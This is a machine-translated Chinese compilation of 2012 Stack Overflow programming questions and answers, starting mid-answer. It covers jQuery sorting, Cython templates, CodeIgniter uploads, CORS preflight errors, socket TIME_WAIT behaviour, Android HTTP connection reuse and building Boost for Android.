我会使用普通的 ASP.NET 表控件。如果您只需要将数据显示为表格，那么它使用简单且功能强大。从逻辑上讲，它对应于 HTML 的*table*元素。请参阅[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.table(v=vs.90).aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.table(v=vs.90).aspx)

*SPView*类表示 SharePoint 对象模型中的列表视图。据我所知，它不执行任何内容渲染。

# jquery - jQuery 日期排序不正确，按下按钮时 li 元素会跳转

> ID：13287926
> 
> 赞同：0
> 
> 时间：2012-11-08T11:13:17.587
> 
> 标签：jquery

我已经设法弄清楚如何在 jQuery 中对日期进行排序，但我注意到某些日期没有正确排序，并且当按下其中一个按钮时会有一点跳跃。我该如何解决这个问题？我已经在[http://jsfiddle.net/Erah9/1/](http://jsfiddle.net/Erah9/1/)上发布了我的代码。到目前为止，这是我的代码：

**HTML**

```
<div style="padding-top: 20px;">
<input class="btn" type="button" value="Oldest First" id="sortAsc"/>
<input class="btn" type="button" value="Newest First" id="sortDesc"/>
</div>

<div id="wrapper" style="padding-top: 20px">
        <ul>
        <li class='item'><div class='activity_date'>01/10/2012</div>
        <div class='activity_box'>
        <div class='activity_text' id='act'>Allocated request</div>
        </div></li><li class='item'><div class='activity_date'>03/10/2012</div>
        <div class='activity_box'>
        <div class='activity_text' id='act'>Failed request</div>
        </div></li><li class='item'><div class='activity_date'>08/10/2012</div>

        <!---------------- 
        SEE JS FIDDLE FOR MORE OF THIS
        ----------------->        

        </li>          
        </ul>
</div> 
```

**JS**

```
 $(function(){ 
    var itemsArray = $('li.item');
    itemsArray.sort(function(a,b){
        var aTime = new Date($(a).find('.activity_date').text()).getTime();
        var bTime = new Date($(b).find('.activity_date').text()).getTime();
        return aTime - bTime;
    });

    $('#sortAsc').click(function(){
        $("#wrapper").empty();
        $(itemsArray).each(function(){
            $("#wrapper").prepend($(this));
        });
    });

    $('#sortDesc').click(function(){
        $("#wrapper").empty();
        $(itemsArray).each(function(){
            $("#wrapper").append($(this));
        });
    });
    }); 
```

非常感谢！提前​</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:20:50.060

您正在添加`<li>`项目而不将它们封装在`<ul>`. 无序列表具有首先显示的默认边距，但是一旦您清空包装器 div 并仅添加单个`<li>`项目，该边距就会被丢弃。

我已经更新了您的小提琴，以便它首先创建`<ul>`然后将`<li>`项目添加到其中：http: [//jsfiddle.net/Erah9/5/](http://jsfiddle.net/Erah9/5/)

至于排序：我认为日期的日期和月份以某种方式混淆了。**[在这个 SO 问题](https://stackoverflow.com/questions/10636779/jquery-date-sorting)**的帮助下，我已经摆弄并让它工作（看起来如此）

[http://jsfiddle.net/Erah9/10/](http://jsfiddle.net/Erah9/10/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T13:15:37.467

您没有正确解析日期，您应该使用[例如以下函数](https://stackoverflow.com/questions/10636779/jquery-date-sorting)：

```
// parse a date in dd/mm/yyyy
function parseDate(input) {
   var parts = input.match(/(\d+)/g);
   // new Date(year, month [, date [, hours[, minutes[, seconds[, ms]]]]])
   return new Date(parts[2], parts[1]-1, parts[0]); // months are 0-based
} 
```

此外，您的排序功能可以参数化，例如：

```
function sort(items, order)
{
    return items.sort(function(a,b){
        var ret = parseDate($(a).find('.activity_date').text()) > parseDate($(b).find('.activity_date').text());
        return (order == "asc") ? ret : !ret;
    });
} 
```

用法可以如下：

```
sort($('li.item'), "desc").each(function(){
    // make some use of the elements sorted in descending order
}); 
```

除了您的 html 包含错误之外，例如不要在许多元素上使用相同的 id。

# python - 模板化 STL 容器作为 cython 中函数的参数

> ID：13287927
> 
> 赞同：5
> 
> 时间：2012-11-08T11:13:22.410
> 
> 标签：python, cython

我在 cython 中编写了一个函数，它将在字符串的 STL 向量中搜索给定的字符串，如果找到则返回 true，否则返回 false。性能在这里非常重要！理想情况下，我希望有一个模板函数来做同样的事情，这样我就不必为每种数据类型编写一个函数。我确信这是可能的，但我不知道模板化函数的 cython 语法。（我知道如何在 C++ 中做到这一点）

```
from libcpp cimport bool
from libcpp.string cimport string
from libcpp.vector cimport vector
from cython.operator cimport dereference as deref, preincrement as inc

cpdef bool is_in_vector(string a, vector[string] v):
    cdef vector[string].iterator it = v.begin()
    while it != v.end():
        if deref(it) == a:
            return True
        #Increment iterator
        inc(it)
    return False 
```

谁能帮我一把？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T15:55:41.427

使用[融合类型](http://docs.cython.org/src/userguide/fusedtypes.html)。

例子：

```
cimport cython

ctypedef fused any:
    string
    cython.int

cpdef bool is_in_vector(string a, vector[any] v) 
```

或者这样：

```
ctypedef fused vector_t:
    vector[string]
    vector[cython.int]

cpdef bool is_in_vector(string a, vector_t v) 
```

# css - 禁用 xscroll ipad

> ID：13287928
> 
> 赞同：0
> 
> 时间：2012-11-08T11:13:26.950
> 
> 标签：css, ipad, overflow

我目前正在用这个（下图）隐藏 x 滚动条，但它实际上在 ipad 上仍然可见，并且在桌面浏览器（Chrome）中可以正常工作。有什么想法可以完全失去它吗？

```
body {
overflow-x: hidden;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-01T16:36:09.437

网站上的**jquery.ui.touch.js**文件通常会阻止垂直滚动，只需阻止它！

# wordpress - 我可以使用主题主题框架进行高级主题开发吗？

> ID：13287930
> 
> 赞同：0
> 
> 时间：2012-11-08T11:13:36.883
> 
> 标签：wordpress, wordpress-theming

使用主题 wordpress 主题框架来开发高级主题是一个好的决定吗？大多数wordpress主题市场都接受了吗？先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:28:27.250

是的，这是一个不错的选择，并且在 wordpress 主题市场上被接受

# php - 验证是否在 codeigniter 中选择了要上传的文件

> ID：13287931
> 
> 赞同：6
> 
> 时间：2012-11-08T11:13:41.343
> 
> 标签：php, codeigniter

嗨，我在上传文件部分遇到了一些麻烦。好吧，基本上我有一个带有上传徽标部分的表单，其中如果用户不选择徽标，他/她仍然可以同时更新他/她的个人资料，用户也可以选择上传徽标，但它有一些限制。现在我不知道如何验证该部分以知道他/她是否选择了图像。到目前为止，这是我在 CI 控制器中的代码：

```
if (//CHECK IF THERE IS A FILE FOR UPLOAD){
                $new_name = $data['id'];

                $config['upload_path'] = './Logos/';
                $config['allowed_types'] = 'jpg|png|gif';
                $config['max_size'] = '100';
                $config['max_width']  = '100';
                $config['max_height']  = '100';

                $this->load->library('upload', $config);

                    if ( ! $this->upload->do_upload())
                    {
                        array_push($data['error_message'], "You have the following errors in your entry:\n");
                        array_push($data['error_message'], "- Logo must be 100x100 pixels in size not exceeding 100KB with JPG,PNG or GIF format");
                        array_push($data['error_message'], "\nLogo upload failed.");
                        $data['check_error'] = true;
                    }
                    else
                    {
                        $data = array('upload_data' => $this->upload->data());

                        //DO UPDATE PART HERE
                        $file = $data['upload_data']['file_name'];
                        rename($config['upload_path'] . $file, $config['upload_path'] .$new_name.'.jpg');
                        //GO TO SETTINGS
                        $this->load->helper('url');  
                        redirect($data['base'].'settings');
                    }
                } 
```

if 中的部分是我想设置验证的地方。我尝试了一些技巧，但所有这些都无法正常工作。

这是我的视图部分，如果某个 ID 的徽标已经存在，则仅显示他/她的徽标或显示默认徽标：

```
 <tr>
    <td><p class="titles">Logo</p></td>
    <td>
    <div>
        <input type="text" id="fileName" class="file_input_textbox" readonly="readonly">

        <div class="file_input_div">
          <input type="button" value="Browse" class="file_input_button" />
          <input type="file" class="file_input_hidden" onchange="javascript: document.getElementById('fileName').value = this.value" id="upload" name="userfile" />
        </div>
    </div>
    </td>
</tr>

<tr>
<td>
</td>
<td>
<p class="titles">100px x 100px jpg, png or gif only.</p>
</td>
</tr>

<tr>
<td><p class="titles">Current Logo</p></td>
<td>
    <img src="<?php if(is_array(@getimagesize($base."Logos/".$id.".jpg"))){echo $base."Logos/".$id.".jpg";}else{echo $base."Logos/default.jpg";} ?>"  style="margin:0px 0px 0px 90px;"/>
</td>
</tr> 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-08T11:35:49.527

在让 CI 的上传类完成这项工作之前，我通常会使用原生 PHP 来检查文件是否正在上传：

```
if (isset($_FILES['upload_field_name']) && is_uploaded_file($_FILES['upload_field_name']['tmp_name'])) {
    //load upload class with the config, etc...
    $this->load->library('upload', $config);
} 
```

# ember.js - Ember - 路由器不为包含 id 的动态路由调用反序列化

> ID：13287932
> 
> 赞同：0
> 
> 时间：2012-11-08T11:13:42.963
> 
> 标签：ember.js

我构建了以下[jsfiddle](http://jsfiddle.net/dagda1/rgHyB/130/)来说明我的问题。

在上面的要点中，我有一个包含动态 id 段的路由：

```
cowan: Ember.Route.extend
  route: '/:cowan_id'
    connectOutlets: (router, cowan) ->
      router.get('applicationController').connectOutlet('cowan', cowan)
    serialize: (router, id) ->
      {cowan_id: id}                    
    deserialize: (router, params) ->
      console.log 'never gets here, do I need to put this logic in connectOutlets?'
      App.cowans.filter((cow) -> cow.get('id') == params.cowan_id).get('firstObject') 
```

问题是当我进入这条路线时没有调用反序列化。

我认为当 _id 在调用 connectOutlets 的 url 中时。

我错了还是为什么不调用反序列化？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T16:40:08.103

您的小提琴有一些错误，但我假设这只是因为您只想提供足够的代码来显示`deserialize`. 我暂时忽略这些错误。

只有当您通过 URL 输入路由时，才会调用反序列化函数。它基本上将 URL 物化（反序列化）为 Ember 对象。从另一个状态转换到路由不会反序列化，因为到那时应该没有任何东西可以反序列化。

您可以看到，当您使用此 URL： http: [//jsfiddle.net/rgHyB/134/show/#/cowans/1](http://jsfiddle.net/rgHyB/134/show/#/cowans/1)时，您的路由器实际上正在反序列化。无论`deserialize`返回什么都将是`connectOutlets`. 此外，`deserialize`可以返回一个承诺，允许您稍后进入 connectOutlets。这允许您等待 ajax 调用完成。

# video - HTML 5 Video 标签源是否来自流式 IP cam？

> ID：13287933
> 
> 赞同：2
> 
> 时间：2012-11-08T11:13:42.860
> 
> 标签：video, streaming, html5-video, ip-camera

我看到这篇文章[http://www.html5rocks.com/en/tutorials/getusermedia/intro/](http://www.html5rocks.com/en/tutorials/getusermedia/intro/)，它解释了如何从网络摄像头和麦克风等用户设备捕获音频和视频。

我的问题是我们可以使用这种方法从 IP cam 捕获视频流吗？所以基本上它可以从 IP 摄像机的网络流而不是本地设备访问多媒体流（视频、音频或两者）。谁能指出我正确的方向？可能吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T17:13:39.857

HTML 捕获旨在与本地设备等进行交互，您的问题与此完全不同。可能，您的问题更容易解决，因为 HTML 对播放网络视频流的支持比从本地设备捕获的更好。然后，您可能能够从显示的流中捕获帧，如 JavaScript `Image`。

您首先需要弄清楚您的 IP 摄像机是否进行流式传输。一些相机使用流媒体协议（RTP 等），您的浏览器元素可能支持这些协议。其他相机使用一种称为[渐进式下载](http://en.wikipedia.org/wiki/Progressive_download)的方法，在这种方法中，它们正在生成由客户端下载的无限文件。如果您的相机是这种情况，您也许可以使用 XHR 简单地检索该文件。

# c - 在 C/C# 中与 DLL 链接

> ID：13287934
> 
> 赞同：1
> 
> 时间：2012-11-08T11:13:54.280
> 
> 标签：c, dll, linker, imp

我一直在尝试链接到第三方 DLL。我尝试了 3 种不同的方法：在 Cygwin 中编译 C，在 Visual Studio 中编译 C++，在 Visual Studio 中编译 C#。每次编译程序时，都会出现以下错误：

Cygwin：未定义对“__imp__IEC61850_Create”的引用

Visual S：LNK2019：未解析的外部符号“__imp__IEC61850_Create”

正如您可能已经收集到的那样，我试图调用在 DLL 中找到的函数“IEC61850_Create”，但它总是出现带有“__imp__”前缀的错误。由于 DLL 是第三方的，我无法查看源代码。在我搜索过的其他地方，人们通常会谈论附带的 .o 或 .lib 文件。在这种情况下，我拥有的唯一资源是 .dll。

有没有其他人经历过这样的事情，或者知道我如何链接到图书馆？如果需要，我可以提供示例代码。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:43:42.043

您确实需要链接到该`.lib`文件，因为只有它具有`__imp__`静态链接所需的存根。

但是，您可以做的是创建一个`.def`文件并使用`lib`将其转换为`.lib`文件。

或者，您可以创建一个带有空函数的虚拟项目来创建一个`.dll`和一个`.lib`文件，链接到该`.lib`文件，然后`.dll`在实际程序中使用真实的项目。

有关详细信息，您可以阅读 Microsoft 知识库文章[131313](http://support.microsoft.com/kb/131313)。

# python - 如何强制使用 python 打开的套接字关闭？

> ID：13287935
> 
> 赞同：5
> 
> 时间：2012-11-08T11:13:53.870
> 
> 标签：python, sockets, apache-kafka

我目前正在使用此库对我设置的 kafka 服务器进行压力测试：[https ://github.com/dsully/pykafka](https://github.com/dsully/pykafka)

```
import kafka
import time

def test_kafka_server(n=1):
    for i in range(0,n):
        producer = kafka.producer.Producer('test',host='10.137.8.192')
        message = kafka.message.Message(str(time.time()))
        producer.send(message)
        producer.disconnect()

def main():
    test_kafka_server(100000)

if __name__ == '__main__':
    main() 
```

最终发生的事情是我最终使我自己的本地机器超载。

我收到**错误 10055**，根据谷歌的说法，这意味着*“Windows 已用完 TCP/IP 套接字缓冲区，因为同时打开了太多连接。”* 根据 netstat， producer.disconnect() 不是关闭套接字，而是将其置于`TIME_WAIT`状态。

ipython 调试器指向这一行：

```
C:\Python27\lib\socket.pyc in meth(name, self, *args)
    222     proto = property(lambda self: self._sock.proto, doc="the socket protocol")
    223 
--> 224 def meth(name,self,*args):
    225     return getattr(self._sock,name)(*args)
    226 
```

作为罪魁祸首，但这似乎会使事情变得比我感到舒服的要低。

我已经搜索并发现这个[Python 套接字没有正确关闭连接](https://stackoverflow.com/questions/5040491/python-socket-doesnt-close-connection-properly)，建议这样做：

```
setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
```

所以，我在 io.py 文件中使用该选项重建了 pykafka 库：

```
 def connect(self):
    """ Connect to the Kafka server. """
    global socket
    self.socket = socket.socket()
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    self.socket.connect((self.host, self.port)) 
```

我仍然得到同样的错误。

我没有把 setsockopt 线放在正确的位置吗？还有什么我可以尝试的吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T12:22:51.223

您所描述的是套接字级别的正常 TCP 行为。当用户级程序关闭套接字时，内核不会立即释放套接字。它进入 TIME_WAIT 状态：

> TIME-WAIT（服务器或客户端）表示等待足够的时间以确保远程 TCP 收到其连接终止请求的确认。[根据 RFC 793，连接可以在 TIME-WAIT 中停留最多四分钟，称为 MSL（最大分段寿命）。

所以套接字是关闭的。socket.SO_REUSEADDR 用于侦听器（服务器），不影响客户端连接。嗯，确实在绑定socket的时候用到了。

# ruby-on-rails - 在控制器测试中包含辅助方法

> ID：13287937
> 
> 赞同：1
> 
> 时间：2012-11-08T11:13:56.170
> 
> 标签：ruby-on-rails, ruby-on-rails-3

如何在我的 controller_spec 代码中包含一些帮助程序？我在 dates_ads_helper 中有一个名为“a_title(ads)”的方法，并返回 self。如何在我的 controller_spec 测试中使用此方法？

当我尝试在我的 controller_spec 文件中调用它时，我收到了这个错误

```
NoMethodError:
       undefined method `a_title' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T13:48:05.273

要使用模板引擎中已经包含的辅助方法：

Rails 2：使用@template 变量。Rails 3：有很好的控制器方法 view_context 使用 a_title

```
# rails 3 sample
def controller_action
  @price = view_context.a_title( 42.0 ) 
end

# rails 2 sample
def controller_action
  @price = @template.a_title( 42.0 ) 
end 
```

如果你想在助手和控制器之间共享一个方法，你可以通过助手方法定义：

```
class SomeController < ActionController::Base
  helper_method :my_shared_method
  ...

  def my_shared_method
    #do stuff
  end
end 
```

问候！

# haskell - Haskell Aeson 解构泛型解析

> ID：13287939
> 
> 赞同：4
> 
> 时间：2012-11-08T11:13:58.907
> 
> 标签：haskell, aeson

我有一个 JSON 请求的风格

```
{"command":"get","params":{"something":"something else"}} 
```

以及[Yesod 书中的这段代码片段](http://www.yesodweb.com/book/json-web-service)

```
{-# LANGUAGE OverloadedStrings #-}
import Network.Wai (Response, responseLBS, Application, requestBody)
import Network.HTTP.Types (status200, status400)
import Network.Wai.Handler.Warp (run)
import Data.Aeson.Parser (json)
import Data.Conduit.Attoparsec (sinkParser)
import Control.Monad.IO.Class (liftIO)
import Data.Aeson (Value(..), encode, object, (.=))
import Control.Exception (SomeException)
import Data.ByteString (ByteString)
import Data.Conduit (ResourceT, ($$))
import Control.Exception.Lifted (handle)

main :: IO ()
main = run 3000 app

app :: Application
app req = handle invalidJson $ do
    value <- requestBody req $$ sinkParser json
    newValue <- liftIO $ modValue value
    return $ responseLBS
        status200
        [("Content-Type", "application/json")]
        $ encode newValue

invalidJson :: SomeException -> ResourceT IO Response
invalidJson ex = return $ responseLBS
    status400
    [("Content-Type", "application/json")]
    $ encode $ object
        [ ("message" .= show ex)
        ]

-- Application-specific logic would go here.
modValue :: Value -> IO Value
modValue (Object o) 
    | -- key "command" corresponds to value "get"
    | otherwise = fail "Invalid command" 
```

但是我无法理解如何解构生成的 Value 数据结构。如何获取键的值等。我意识到我可以解析为明确定义的数据结构，但这会给我的用例带来其他类型的问题。

在 modValue 中，我在不知道该放什么的地方发表了评论。我试着把它当作一个地图，因为这就是它在 Aeson 内部的实现方式，但这显然不是类型检查。

编辑：

将 Data.HashMap 添加到导入并使用该行

```
 | M.lookup "command" o == Just "get" = return $ object [("result" .= (String "YAY"))] 
```

给出以下错误消息。

```
main.hs:39:26:
Couldn't match expected type `M.Map k0 a0'
            with actual type `aeson-0.6.0.2:Data.Aeson.Types.Internal.Object'
In the second argument of `M.lookup', namely `o'
In the first argument of `(==)', namely `M.lookup "command" o'
In the expression: M.lookup "command" o == Just "get" 
```

编辑2：

在一个突然的预感中，我找到了我之前收到的一条涉及“无序容器”的错误消息。这是 Aeson 使用的包。但我意识到我还安装了包 hashmap，它是作为 Data.HashMap 导入的。来自无序容器的哈希图被导入为 Data.HashMap.Strict 或 Lazy！

无论如何都要更改线路`import qualified Data.HashMap as M`以`import qualified Data.HashMap.Strict as M`修复它。现在给定的答案有效！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T11:21:42.257

由于[aeson JSON 对象是一个 Hashmap](http://hackage.haskell.org/packages/archive/aeson/latest/doc/html/Data-Aeson.html#t%3aObject)，在这种情况下，您可以使用[Hasmap 接口](http://hackage.haskell.org/packages/archive/unordered-containers/0.2.1.0/doc/html/Data-HashMap-Strict.html#g:2)`lookup`。

```
import qualified Data.HashMap.Strict as M

M.lookup "command" o == Just "get" 
```

# php - 即使在配置中，HTMLPurifier 也会忽略属性

> ID：13287946
> 
> 赞同：1
> 
> 时间：2012-11-08T11:14:03.137
> 
> 标签：php, htmlpurifier

我在允许某些 HTML 属性进入 HTMLPurifier 的白名单时遇到问题。

这是我的代码：

```
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'u,p,b,i,span[style],strike,s,strong,em,li,ul,ol,div[align],br,img[src|alt|width|height],sub,sup');
$purifier = new HTMLPurifier($config); 
```

当我运行时：`$clean_str = $purifier->purify($dirty_str);`在这个：`<div align="left">Left</div>`我得到这个：`<div>left</div>`。

如果我删除：`div[align]`从`HTML.Allowed`我得到这个：`Left`- 所以我知道它`HTML.Allowed`适用于元素，但不适用于属性。

我确定我在做一些愚蠢的事情，但我终生无法弄清楚！

提前感谢您的帮助。

将 htmlpurifier-4.4.0-lite 与 PHP 5.3.14 一起使用

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T19:18:36.677

关闭魔术引号。请参阅手册： http: [//php.net/manual/en/security.magicquotes.disabling.php](http://php.net/manual/en/security.magicquotes.disabling.php)

# javascript - OPTIONS 405 (Method Not Allowed) 无论服务器发送 Access-Control-Allow-Methods:OPTIONS, GET, HEAD, POST

> ID：13287949
> 
> 赞同：12
> 
> 时间：2012-11-08T11:14:12.233
> 
> 标签：javascript, sencha-touch, cross-domain, cors, jqxhr

我正在尝试发出跨域请求，并且我的服务器配置为发送以下标头：

```
Access-Control-Allow-Credentials:true
Access-Control-Allow-Headers:x-requested-with, Authorization
Access-Control-Allow-Methods:OPTIONS, GET, HEAD, POST
Access-Control-Allow-Origin:* 
```

但是当发出一个 OPTION 请求时，我得到了`OPTIONS 405 (Method Not Allowed)`错误。

任何想法是什么问题以及如何解决？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-08T00:45:44.017

我建议2个解决方案：

1）如果您使用的是 WebAPI，则**需要**实现按约定应如下所示的选项方法：

```
public class XXXController : ApiController
{
    // OPTION http-verb handler
    public string OptionsXXX()
    {
        return null; // HTTP 200 response with empty body
    }

    ...
} 
```

2) 如果您**没有**使用 WebAPI，请尝试了解代码的哪一部分触发`OPTIONS 405 (Method Not Allowed)`了 OPTION 调用的错误。在这种情况下，我会检查是否尝试将`Web.config`这些有效的文件添加到文件`<customHeaders/>`中：

```
<configuration>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <!-- CORS temporary solution -->
        <add name="Access-Control-Allow-Origin" value="*" />
        <add name="Access-Control-Allow-Headers" value="Content-Type, Authorization, Accept, X-Requested-With" />
        <add name="Access-Control-Allow-Methods" value="OPTIONS, TRACE, GET, HEAD, POST, PUT" />
      </customHeaders>
    </httpProtocol>
  </system.webServer>
</configuration> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-08T18:03:45.910

您的 Web 服务器/应用程序可能已配置为为每个 HTTP GET 动词和 POST 动词请求发送上述响应标头。但是您的 Web 服务器是否配置为处理 HTTP OPTIONS 动词？

如果您需要更多详细信息，请提供您正在使用的网络服务器和应用程序编程技术。

一点背景知识，当您有带有一些自定义请求标头的跨域请求时，浏览器会发送一个 OPTIONS 请求。此请求在实际请求之前发出。仅当此请求返回您提到的响应标头时，浏览器才会发出实际请求。

// 这些 OPTIONS 请求称为预检请求——通常浏览器开发工具不会在其网络 tab.f 中跟踪它们

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-11-03T14:58:08.877

您需要修改默认的 OPTIONSVerbHandler。如果使用 asp classic，这意味着在您的 Web.config 文件中添加以下行：

```
 <handlers>
        <remove name="OPTIONSVerbHandler" />
        <add name="OPTIONSVerbHandler" path="*" verb="OPTIONS" modules="IsapiModule" scriptProcessor="C:\Windows\System32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="None" />
    </handlers> 
```

# android - 通过一个连接从不同域下载文件

> ID：13287953
> 
> 赞同：0
> 
> 时间：2012-11-08T11:14:20.850
> 
> 标签：android, network-programming, http-headers, apache-httpclient-4.x

好吧，这个问题听起来有点疯狂，但我只是想节省时间和精力。在移动设备上打开连接需要时间和精力，所以我想尽可能重用打开的连接。

我可能需要从`example.com`和下载文件`example.net`。两个站点都托管在同一服务器/IP 上，因此应该可以通过一个连接从两个文档中获取文档。

```
DefaultHttpClient client = new DefaultHttpClient();
HttpGet get = new HttpGet("http://example.com/robots.txt");
HttpGet get2 = new HttpGet("http://example.net/robots.txt");
URI uri = get.getURI();
HttpHost host = new HttpHost(uri.getHost(), uri.getPort(), uri.getScheme());
ResponseHandler<String> responseHandler = new BasicResponseHandler();
HttpResponse response = client.execute(host, get);
String data = responseHandler.handleResponse(response);
Log.v("test", "Downloaded " + data.length() + " bytes from " + get.getURI().toASCIIString());
response = client.execute(host, get2);
data = responseHandler.handleResponse(response);
Log.v("test", "Downloaded " + data.length() + " bytes from " + get2.getURI().toASCIIString()); 
```

问题是当我不`HttpHost`为每个呼叫使用它时，就会建立一个新连接。如果我使用这两个`Host`HTTP 标头都指向第一个域。我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T16:08:50.403

解决方案很简单（如果你找到了）：

```
HttpGet get2 = new HttpGet("http://example.com/robots.txt");
BasicHttpParams params = new BasicHttpParams();
params.setParameter(ClientPNames.VIRTUAL_HOST, new HttpHost("example.net", -1, "http"));
get2.setParams(params); 
```

所以连接会被重用，因为它是相同的域/端口/模式，并且`DefaultHttpClient`会寻找那个参数`ClientPNames.VIRTUAL_HOST`。

我使用 android 实际使用的源代码找到了解决方案，可以在[code.google.com](https://code.google.com/p/android-source-browsing/source/browse/src/org/apache/http/impl/client/DefaultRequestDirector.java?repo=platform--external--apache-http&name=ics-mr1-release#387)上找到。

# android - setProgress() 如何知道这段代码中要增长的进度的颜色是什么？

> ID：13287958
> 
> 赞同：0
> 
> 时间：2012-11-08T11:14:39.333
> 
> 标签：android, progress-bar

当它调用 setProgress(20) 时，它怎么知道它是绿色而不是灰色？

```
 pb.setProgress(0);
  pb.setProgressDrawable(getResources().getDrawable(R.drawable.green_progress));
  pb.setProgress(20); 
```

这是**green_progress.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">

<item android:id="@android:id/background">
    <shape>
        <corners android:radius="5dip" />
        <gradient
                android:startColor="#ff9d9e9d"
                android:centerColor="#ff5a5d5a"
                android:centerY="0.75"
                android:endColor="#ff747674"
                android:angle="270"
        />
    </shape>
</item>
<item
    android:id="@android:id/progress">
    <clip>
        <shape>
            <corners
                android:radius="5dip" />
            <gradient
                    android:startColor="@color/greenStart"
                    android:centerColor="@color/greenMid"
                    android:centerY="0.75"
                    android:endColor="@color/greenEnd"
                    android:angle="270"
            />
        </shape>
    </clip>
</item>

</layer-list> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T14:28:47.017

这要归功于 ，这是一个由班级`@android:id/progress`所知的特殊 id 。`ProgressDialog`因此，在进程中`ProgressDialog`，代码知道它必须扩展哪个形状以及必须缩小哪个形状。

# c++ - C ++中“主”线程的ID

> ID：13287963
> 
> 赞同：9
> 
> 时间：2012-11-08T11:14:49.537
> 
> 标签：c++, multithreading, c++11

c++中有没有办法获取“主”程序线程的ID？

我看到它`std::this_thread::get_id()`获取了当前正在执行的线程的 id，但我需要`main`原始程序线程的 id。我没有看到任何功能来获得这个。

原因是我有一些非线程安全的内部函数，它们只能在应用程序的原始线程上调用，所以为了安全起见，我想做：-

```
assert(std::this_thread::get_id() == std::main_thread::get_id()); 
```

但是当然没有功能可以做到这一点，而且我看不到任何获取该信息的方法。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-08T11:18:04.380

You could save it while `this_thread` is still the original thread:

```
std::thread::id main_thread_id;

int main() {
    main_thread_id = std::this_thread::get_id(); // gotcha!
    /* go on */
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T11:20:14.343

This topic seems to be discussed quite a few times here, like in this topic:

*   [Getting a handle to the process main thread](https://stackoverflow.com/questions/1969579/getting-a-handle-to-the-processs-main-thread)

You can find some solutions, but I'd just think the other way round... When starting the new threads, just supply the id of the main thread to them, and store that in a field in the other threads. If that is not going to change throughout the threads' life, you're good to go, you can reference the "main" thread by those handles.

# android - 为 Android 构建提升

> ID：13287978
> 
> 赞同：3
> 
> 时间：2012-11-08T11:15:47.307
> 
> 标签：android, boost, android-ndk

我搜索了为 Android 构建提升的教程。我找到[了这个](http://www.codexperiments.com/android/2011/05/tips-tricks-building-boost-with-ndk-r5/)。这似乎是它的教程，因为我发现的所有构建脚本（即[这个](https://github.com/MysticTreeGames/Boost-for-Android)）都建立在它之上。

它对我不起作用。但是我试图让它工作，它没有。已经很郁闷了

首先是有一个错误告诉我：

```
 Der Befehl ".." ist entweder falsch geschrieben oder konnte nicht gefunden werden. 
```

这是德语：找不到命令“..”

我不知道那是从哪里来的。它连续出现 4 次。

除了这个错误，我得到了这个错误：

```
 cc1plus.exe: error: unrecognized command line option "-mthreads" 
```

我在这里找到了一个解决方案： [在 cygwin 上为 android 编译 boost 时无法识别的命令行选项](https://stackoverflow.com/questions/8274430/unrecognized-command-line-option-while-compiling-boost-for-android-on-cygwin)

现在我仍然有“..”-错误和：

```
 Building the Boost C++ Libraries.

    Performing configuration checks

        - 32-bit                   : yes
        - x86                      : no
        - power                    : no
        - arm                      : yes
    error: No best alternative for libs/context/build/asm_context_sources
        next alternative: required properties: <abi>aapcs <architecture>arm <binary-
    format>elf <toolset>gcc
            not matched
        next alternative: required properties: <abi>aapcs <architecture>arm <binary-
    format>elf <toolset>qcc
            not matched
        next alternative: required properties: <abi>aapcs <architecture>arm <binary-
    format>elf
            not matched
        next alternative: required properties: <abi>o32 <architecture>mips1 <binary-
    format>elf <toolset>gcc
            not matched
        next alternative: required properties: <abi>o32 <architecture>mips1 <binary-
    format>elf <toolset>qcc
            not matched
        next alternative: required properties: <abi>o32 <architecture>mips1 <binary-
    format>elf
            not matched
        next alternative: required properties: <abi>sysv <address-model>32 <architec
    ture>power <binary-format>elf <toolset>gcc
            not matched
        next alternative: required properties: <abi>sysv <address-model>32 <architec
    ture>power <binary-format>elf <toolset>qcc
            not matched
        next alternative: required properties: <abi>sysv <address-model>32 <architec
    ture>power <binary-format>elf
            not matched
        next alternative: required properties: <abi>sysv <address-model>64 <architec
    ture>power <binary-format>elf <toolset>gcc
            not matched
        next alternative: required properties: <abi>sysv <address-model>64 <architec
    ture>power <binary-format>elf <toolset>qcc
            not matched
        next alternative: required properties: <abi>sysv <address-model>64 <architec
    ture>power <binary-format>elf
            not matched 
```

在我不知道的地方，那可能意味着什么。这还不是全部。

[这里是整个输出](http://pastebin.com/3XYBwvGV)

我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T13:34:33.333

用户配置中提到的包含和库路径详细信息与 NDK PATH 不匹配

请检查以下包含路径并根据 NDK 路径更新它

-I$(ANDROID_NDK)/sources/cxx-stl/gnu-libstdc++/4.4.3/include

